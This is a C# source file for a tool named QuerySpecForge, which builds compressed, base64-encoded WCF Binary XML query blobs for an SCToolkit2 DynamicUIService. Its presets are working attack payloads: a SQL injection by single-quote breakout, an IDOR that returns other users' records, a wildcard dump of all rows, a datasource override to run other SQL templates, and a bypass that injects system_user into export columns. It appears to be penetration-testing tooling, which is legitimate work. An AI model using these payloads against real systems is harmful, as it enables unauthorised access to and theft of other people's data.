using System.IO.Compression;
using System.Runtime.Serialization;
using System.Text;
using System.Xml;
using SCToolkit2.Core;

// ============================================================================
// QuerySpecForge - Build WCF Binary XML blobs for SCToolkit2 DynamicUIService
//
// Usage:
//   dotnet run -- encode [preset]    Encode a QuerySpec to base64 blob
//   dotnet run -- decode <base64>    Decode a blob back to readable XML
//   dotnet run -- decodefile <path>  Decode a blob from a file
//
// Presets:
//   normal     - Normal request (case_code = 143560)
//   sqli       - SQL injection via value (single quote breakout)
//   idor       - IDOR via Negated=true (returns other users' data)
//   wildcard   - Dump all rows via OP_LIKE + %
//   override   - Use OverrideDataSourceCode to run a different query
//   columns    - system_user in ExportColumns
//   custom     - Edit the BuildCustom() method for your own payload
// ============================================================================

class Program
{
    static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            PrintUsage();
            return;
        }

        switch (args[0].ToLower())
        {
            case "encode":
                string preset = args.Length > 1 ? args[1] : "normal";
                RunEncode(preset);
                break;

            case "decode":
                if (args.Length < 2) { Console.WriteLine("Provide base64 string"); return; }
                RunDecode(args[1]);
                break;

            case "decodefile":
                if (args.Length < 2) { Console.WriteLine("Provide file path"); return; }
                string b64 = File.ReadAllText(args[1]).Trim();
                RunDecode(b64);
                break;

            default:
                PrintUsage();
                break;
        }
    }

    static void PrintUsage()
    {
        Console.WriteLine("QuerySpecForge - WCF Binary XML Payload Builder");
        Console.WriteLine();
        Console.WriteLine("Usage:");
        Console.WriteLine("  dotnet run -- encode [preset]     Encode to base64");
        Console.WriteLine("  dotnet run -- decode <base64>     Decode blob to XML");
        Console.WriteLine("  dotnet run -- decodefile <path>   Decode blob from file");
        Console.WriteLine();
        Console.WriteLine("Presets: normal, sqli, idor, wildcard, override, columns, custom");
    }

    // ========================================================================
    // PAYLOAD PRESETS - Edit these for your testing
    // ========================================================================

    static QuerySpec BuildNormal()
    {
        var qs = new QuerySpec
        {
            LongQuery = true,
            UseParametrizeSQL = false,
            RetrievalMode = "AllRecords",
        };

        qs._Criteria["case_code"] = new QuerySpec.FieldCriteria
        {
            FieldName = "case_code",
            OrNull = false,
            SqlOperator = new QuerySpec.SqlOperatorSpec
            {
                SqlOperator = "OP_EQ",
                Negated = false,
            },
            Value = 143560
        };

        return qs;
    }

    static QuerySpec BuildSqli()
    {
        // SQL Injection via value - single quote breakout
        // Produces: WHERE case_code = '143560' OR '1'='1'
        var qs = new QuerySpec
        {
            LongQuery = true,
            UseParametrizeSQL = false,  // This is the key - forces string concatenation
            RetrievalMode = "AllRecords",
        };

        qs._Criteria["case_code"] = new QuerySpec.FieldCriteria
        {
            FieldName = "case_code",
            OrNull = false,
            SqlOperator = new QuerySpec.SqlOperatorSpec
            {
                SqlOperator = "OP_EQ",
                Negated = false,
            },
            // Single quote breaks out of the string literal
            Value = "143560' OR '1'='1"
        };

        return qs;
    }

    static QuerySpec BuildIdor()
    {
        // IDOR via Negated=true - returns everyone EXCEPT case 143560
        var qs = new QuerySpec
        {
            LongQuery = true,
            UseParametrizeSQL = false,
            RetrievalMode = "AllRecords",
        };

        qs._Criteria["case_code"] = new QuerySpec.FieldCriteria
        {
            FieldName = "case_code",
            OrNull = false,
            SqlOperator = new QuerySpec.SqlOperatorSpec
            {
                SqlOperator = "OP_EQ",
                Negated = true,   // <-- Returns everyone else's data
            },
            Value = 143560
        };

        return qs;
    }

    static QuerySpec BuildWildcard()
    {
        // Dump all rows via LIKE '%'
        var qs = new QuerySpec
        {
            LongQuery = true,
            UseParametrizeSQL = false,
            RetrievalMode = "AllRecords",
        };

        qs._Criteria["case_code"] = new QuerySpec.FieldCriteria
        {
            FieldName = "case_code",
            OrNull = false,
            SqlOperator = new QuerySpec.SqlOperatorSpec
            {
                SqlOperator = "OP_LIKE",  // <-- LIKE operator
                Negated = false,
            },
            Value = "%"   // <-- Wildcard matches everything
        };

        return qs;
    }

    static QuerySpec BuildOverride()
    {
        // Use OverrideDataSourceCode to run a different SQL template
        var qs = new QuerySpec
        {
            LongQuery = true,
            UseParametrizeSQL = false,
            RetrievalMode = "AllRecords",
            OverrideDataSourceCode = 1,  // <-- Try different numbers: 1, 2, 3, ...
        };

        qs._Criteria["case_code"] = new QuerySpec.FieldCriteria
        {
            FieldName = "case_code",
            OrNull = false,
            SqlOperator = new QuerySpec.SqlOperatorSpec
            {
                SqlOperator = "OP_EQ",
                Negated = false,
            },
            Value = 143560
        };

        return qs;
    }

    static QuerySpec BuildColumns()
    {
        // SqlIdentifierGuard bypass via system_user in ExportColumns
        var qs = new QuerySpec
        {
            LongQuery = true,
            UseParametrizeSQL = false,
            RetrievalMode = "AllRecords",
            ExportColumns = "case_code,system_user,current_user,current_timestamp",
        };

        qs._Criteria["case_code"] = new QuerySpec.FieldCriteria
        {
            FieldName = "case_code",
            OrNull = false,
            SqlOperator = new QuerySpec.SqlOperatorSpec
            {
                SqlOperator = "OP_EQ",
                Negated = false,
            },
            Value = 143560
        };

        return qs;
    }

    static QuerySpec BuildCustom()
    {
        // ============================================================
        // EDIT THIS METHOD FOR YOUR CUSTOM PAYLOADS
        // ============================================================

        var qs = new QuerySpec
        {
            LongQuery = true,
            UseParametrizeSQL = false,
            RetrievalMode = "AllRecords",
            // OverrideDataSourceCode = 42,  // Uncomment to override datasource
            // ExportColumns = "col1,col2,system_user",  // Uncomment for column injection
        };

        // Add criteria
        qs._Criteria["case_code"] = new QuerySpec.FieldCriteria
        {
            FieldName = "case_code",
            OrNull = false,
            SqlOperator = new QuerySpec.SqlOperatorSpec
            {
                SqlOperator = "OP_EQ",
                Negated = false,
                // AdditionalValue = 99999,  // Uncomment for BETWEEN
            },
            Value = 143560
        };

        // Add SQL parameters (for @-prefixed params in the SQL template)
        // qs._SQLParameters._Parameters["@emp_code"] = 12731;
        // qs._SQLParameters._Parameters["@lawy_code"] = 0;

        return qs;
    }

    // ========================================================================
    // SERIALIZATION ENGINE
    // ========================================================================

    static void RunEncode(string preset)
    {
        QuerySpec qs = preset.ToLower() switch
        {
            "normal"   => BuildNormal(),
            "sqli"     => BuildSqli(),
            "idor"     => BuildIdor(),
            "wildcard" => BuildWildcard(),
            "override" => BuildOverride(),
            "columns"  => BuildColumns(),
            "custom"   => BuildCustom(),
            _ => throw new ArgumentException($"Unknown preset: {preset}")
        };

        // Step 1: Serialize to Binary XML
        byte[] binaryXml = SerializeToBinaryXml(qs);

        // Step 2: Zlib compress
        byte[] compressed = ZlibCompress(binaryXml);

        // Step 3: Base64 encode
        string base64 = Convert.ToBase64String(compressed);

        Console.WriteLine($"Preset: {preset}");
        Console.WriteLine($"Binary XML size: {binaryXml.Length} bytes");
        Console.WriteLine($"Compressed size: {compressed.Length} bytes");
        Console.WriteLine($"Base64 length: {base64.Length} chars");
        Console.WriteLine();
        Console.WriteLine("=== BASE64 BLOB (paste into <querySpec> element) ===");
        Console.WriteLine(base64);
        Console.WriteLine();

        // Also show the text XML for debugging
        string textXml = SerializeToTextXml(qs);
        Console.WriteLine("=== TEXT XML (for reference) ===");
        Console.WriteLine(textXml);

        // Save to files
        File.WriteAllText($"payload_{preset}.b64", base64);
        File.WriteAllText($"payload_{preset}.xml", textXml);
        File.WriteAllBytes($"payload_{preset}.bin", binaryXml);
        Console.WriteLine($"\nSaved to: payload_{preset}.b64 / .xml / .bin");
    }

    static void RunDecode(string base64)
    {
        try
        {
            // Step 1: Base64 decode
            byte[] compressed = Convert.FromBase64String(base64);
            Console.WriteLine($"Compressed size: {compressed.Length} bytes");
            Console.WriteLine($"First 4 bytes: {BitConverter.ToString(compressed.Take(4).ToArray())}");

            // Step 2: Zlib decompress
            byte[] binaryXml;
            if (compressed[0] == 0x78) // zlib magic
            {
                binaryXml = ZlibDecompress(compressed);
                Console.WriteLine($"Decompressed size: {binaryXml.Length} bytes (zlib)");
            }
            else
            {
                binaryXml = compressed;
                Console.WriteLine("Not zlib compressed, treating as raw binary XML");
            }

            // Step 3: Try to read as Binary XML
            Console.WriteLine("\n=== DECODED XML ===");
            try
            {
                string xml = BinaryXmlToText(binaryXml);
                Console.WriteLine(xml);
                File.WriteAllText("decoded_output.xml", xml);
                Console.WriteLine("\nSaved to: decoded_output.xml");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Binary XML decode failed: {ex.Message}");
                Console.WriteLine("\n=== RAW STRINGS ===");
                PrintStrings(binaryXml);

                Console.WriteLine("\n=== HEX DUMP (first 256 bytes) ===");
                HexDump(binaryXml, 256);
            }

            // Step 4: Try to deserialize to QuerySpec
            try
            {
                var qs = DeserializeFromBinaryXml(binaryXml);
                Console.WriteLine("\n=== DESERIALIZED QuerySpec ===");
                Console.WriteLine($"  UseParametrizeSQL: {qs.UseParametrizeSQL}");
                Console.WriteLine($"  LongQuery: {qs.LongQuery}");
                Console.WriteLine($"  RetrievalMode: {qs.RetrievalMode}");
                Console.WriteLine($"  OverrideDataSourceCode: {qs.OverrideDataSourceCode}");
                Console.WriteLine($"  ExportColumns: {qs.ExportColumns}");
                Console.WriteLine($"  Criteria count: {qs._Criteria?.Count ?? 0}");
                if (qs._Criteria != null)
                {
                    foreach (var kvp in qs._Criteria)
                    {
                        Console.WriteLine($"    [{kvp.Key}] Field={kvp.Value.FieldName}, " +
                            $"Op={kvp.Value.SqlOperator?.SqlOperator}, " +
                            $"Value={kvp.Value.Value}, " +
                            $"Negated={kvp.Value.SqlOperator?.Negated}");
                    }
                }
                Console.WriteLine($"  SQLParameters count: {qs._SQLParameters?._Parameters?.Count ?? 0}");
                if (qs._SQLParameters?._Parameters != null)
                {
                    foreach (var kvp in qs._SQLParameters._Parameters)
                    {
                        Console.WriteLine($"    [{kvp.Key}] = {kvp.Value}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\nDeserialization to QuerySpec failed: {ex.Message}");
                Console.WriteLine("(This is expected if the actual class structure differs from our model)");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Decode error: {ex.Message}");
        }
    }

    // ========================================================================
    // SERIALIZATION HELPERS
    // ========================================================================

    static byte[] SerializeToBinaryXml(QuerySpec qs)
    {
        var serializer = new DataContractSerializer(typeof(QuerySpec));
        using var ms = new MemoryStream();
        using var writer = XmlDictionaryWriter.CreateBinaryWriter(ms);
        serializer.WriteObject(writer, qs);
        writer.Flush();
        return ms.ToArray();
    }

    static string SerializeToTextXml(QuerySpec qs)
    {
        var serializer = new DataContractSerializer(typeof(QuerySpec));
        using var ms = new MemoryStream();
        using var writer = XmlDictionaryWriter.CreateTextWriter(ms, Encoding.UTF8, false);
        var settings = new XmlWriterSettings { Indent = true };
        serializer.WriteObject(writer, qs);
        writer.Flush();
        return Encoding.UTF8.GetString(ms.ToArray());
    }

    static QuerySpec DeserializeFromBinaryXml(byte[] data)
    {
        var serializer = new DataContractSerializer(typeof(QuerySpec));
        using var ms = new MemoryStream(data);
        using var reader = XmlDictionaryReader.CreateBinaryReader(ms, XmlDictionaryReaderQuotas.Max);
        return (QuerySpec)serializer.ReadObject(reader)!;
    }

    static string BinaryXmlToText(byte[] binaryXml)
    {
        using var ms = new MemoryStream(binaryXml);
        using var reader = XmlDictionaryReader.CreateBinaryReader(ms, XmlDictionaryReaderQuotas.Max);
        var doc = new XmlDocument();
        doc.Load(reader);

        using var sw = new StringWriter();
        using var xw = XmlWriter.Create(sw, new XmlWriterSettings { Indent = true });
        doc.WriteTo(xw);
        xw.Flush();
        return sw.ToString();
    }

    // ========================================================================
    // COMPRESSION HELPERS
    // ========================================================================

    static byte[] ZlibCompress(byte[] data)
    {
        // .NET doesn't have native zlib, but DeflateStream + zlib header works
        using var output = new MemoryStream();

        // Zlib header: CMF=0x78, FLG=0x9C (default compression)
        output.WriteByte(0x78);
        output.WriteByte(0x9C);

        using (var deflate = new DeflateStream(output, CompressionLevel.Optimal, leaveOpen: true))
        {
            deflate.Write(data, 0, data.Length);
        }

        // Zlib footer: Adler32 checksum
        uint adler = Adler32(data);
        output.WriteByte((byte)(adler >> 24));
        output.WriteByte((byte)(adler >> 16));
        output.WriteByte((byte)(adler >> 8));
        output.WriteByte((byte)adler);

        return output.ToArray();
    }

    static byte[] ZlibDecompress(byte[] data)
    {
        // Skip 2-byte zlib header
        using var input = new MemoryStream(data, 2, data.Length - 2);
        using var deflate = new DeflateStream(input, CompressionMode.Decompress);
        using var output = new MemoryStream();
        deflate.CopyTo(output);
        return output.ToArray();
    }

    static uint Adler32(byte[] data)
    {
        uint a = 1, b = 0;
        foreach (byte d in data)
        {
            a = (a + d) % 65521;
            b = (b + a) % 65521;
        }
        return (b << 16) | a;
    }

    // ========================================================================
    // DEBUG HELPERS
    // ========================================================================

    static void PrintStrings(byte[] data, int minLen = 4)
    {
        var current = new List<char>();
        foreach (byte b in data)
        {
            if (b >= 32 && b <= 126)
                current.Add((char)b);
            else
            {
                if (current.Count >= minLen)
                    Console.WriteLine($"  '{new string(current.ToArray())}'");
                current.Clear();
            }
        }
    }

    static void HexDump(byte[] data, int maxBytes = 256)
    {
        int len = Math.Min(data.Length, maxBytes);
        for (int i = 0; i < len; i += 16)
        {
            var hex = string.Join(" ", data.Skip(i).Take(16).Select(b => $"{b:x2}"));
            var ascii = new string(data.Skip(i).Take(16)
                .Select(b => b >= 32 && b <= 126 ? (char)b : '.').ToArray());
            Console.WriteLine($"  {i:x4}: {hex,-48} {ascii}");
        }
    }
}
